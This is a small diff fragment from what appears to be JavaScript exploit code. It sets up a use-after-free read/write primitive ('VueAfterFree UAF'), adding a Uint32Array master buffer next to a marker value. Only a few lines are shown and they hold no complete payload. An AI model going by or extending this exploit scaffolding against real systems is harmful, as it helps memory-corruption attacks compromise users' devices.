@@ -21,6 +21,7 @@ function vaf_make_uaf(arr) {
 }
 
 async function init_vaf_rw() {
+  arw.master = new Uint32Array(6);
   logger.info("Initiate VueAfterFree UAF...");
 
   const marker = new BInt(0xFFFF0000, 0x13371337);
